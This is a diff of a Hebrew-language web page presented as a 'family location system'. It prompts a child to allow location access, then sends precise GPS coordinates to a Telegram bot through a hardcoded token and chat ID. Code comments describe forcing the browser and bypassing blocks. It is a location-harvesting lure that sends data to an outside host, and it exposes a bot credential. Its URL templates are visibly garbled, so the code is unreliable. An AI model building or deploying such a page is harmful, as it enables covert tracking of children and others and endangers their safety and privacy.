@@ -11,17 +11,17 @@
         p { color: #666; font-size: 16px; margin-bottom: 25px; }
         .btn { display: inline-block; background-color: #28a745; color: white; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; width: 100%; box-sizing: border-box; }
         .btn:hover { background-color: #218838; }
-        .status { font-weight: bold; color: #007bff; font-size: 16px; margin-top: 20px; }
+        .status { font-weight: bold; color: #dc3545; font-size: 16px; margin-top: 20px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <h1>מערכת איתור משפחתית</h1>
-    <p>כדי לשלוח את המיקום המדויק להורים, לחץ על הכפתור הירוק למטה ואשר את בקשת המיקום שתקפוץ.</p>
+    <p>כדי לעדכן את ההורים במיקומך המדויק, לחץ על הכפתור הירוק למטה ואשר את בקשת המיקום שתוצג על המסך.</p>
     
-    <!-- כפתור שמכריח את הדפדפן לאפשר בקשת GPS -->
-    <button class="btn" onclick="startTracking()">📍 לחץ כאן לשיתוף מיקום</button>
+    <!-- הכפתור שמפעיל את הקוד המשודרג -->
+    <button class="btn" onclick="askGPS()">📍 לחץ כאן לשיתוף מיקום</button>
     
     <div id="status" class="status"></div>
 </div>
@@ -30,52 +30,55 @@
     const TELEGRAM_TOKEN = '8573992916:AAHFZye_BN7FwKRUJHS24D4pw99v9dwnG6A';
     const CHAT_ID = '8714686528';
 
-    function startTracking() {
-        updateStatus("מבקש גישה ל-GPS...");
+    function askGPS() {
+        document.getElementById('status').style.color = '#007bff';
+        document.getElementById('status').innerText = "מבקש גישה ל-GPS...";
+        
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendLocation, showError, {
+            navigator.geolocation.getCurrentPosition(redirectToTelegram, showError, {
                 enableHighAccuracy: true,
-                timeout: 10000,
+                timeout: 7000,
                 maximumAge: 0
             });
         } else {
-            updateStatus("הדפדפן שלך לא תומך בשליחת מיקום.");
+            document.getElementById('status').innerText = "הדפדפן שלך לא תומך ב-GPS.";
         }
     }
 
-    function sendLocation(position) {
+    function redirectToTelegram(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
+        const accuracy = Math.round(position.coords.accuracy);
         
-        updateStatus("המיקום אותר! מעביר לטלגרם...");
+        document.getElementById('status').style.color = '#28a745';
+        document.getElementById('status').innerText = "המיקום התקבל! מעביר לטלגרם...";
 
         const mapsLink = `https://google.com{lat},${lon}`;
-        const message = encodeURIComponent(`🚨 הילד לחץ על הקישור!\n📍 מיקום: ${mapsLink}\n🎯 רמת דיוק: ${Math.round(accuracy)} מטרים.`);
+        const message = encodeURIComponent(`🚨 הילד פתח את הקישור!\n📍 מיקום: ${mapsLink}\n🎯 רמת דיוק: ${accuracy} מטרים.`);
 
-        // פתיחת חלון ישיר לשרת של טלגרם כדי לעקוף את כל החסימות
-        window.location.href = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+        // בניית הקישור שמכריח את הדפדפן להעביר את המידע לטלגרם בלי חסימות
+        const finalUrl = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+        
+        // מעבר מיידי שמפעיל את השרת
+        window.location.href = finalUrl;
     }
 
     function showError(error) {
+        document.getElementById('status').style.color = '#dc3545';
         switch(error.code) {
             case error.PERMISSION_DENIED:
-                updateStatus("❌ שגיאה: חובה ללחוץ 'אשר' (Allow) על בקשת המיקום.");
+                document.getElementById('status').innerText = "❌ חובה ללחוץ 'אשר' (Allow) על בקשת המיקום.";
                 break;
             case error.POSITION_UNAVAILABLE:
-                updateStatus("❌ שגיאה: ה-GPS במכשיר כבוי או לא זמין.");
+                document.getElementById('status').innerText = "❌ ה-GPS במכשיר כבוי. אנא הפעל אותו.";
                 break;
             case error.TIMEOUT:
-                updateStatus("❌ שגיאה: הזמן לבקשת המיקום עבר, נסה שוב.");
+                document.getElementById('status').innerText = "❌ הזמן עבר. אנא לחץ שוב על הכפתור.";
                 break;
             default:
-                updateStatus("❌ התרחשה שגיאה בלתי צפויה.");
+                document.getElementById('status').innerText = "❌ שגיאה בלתי צפויה.";
                 break;
         }
-    }
-
-    function updateStatus(text) {
-        document.getElementById('status').innerText = text;
     }
 </script>
 
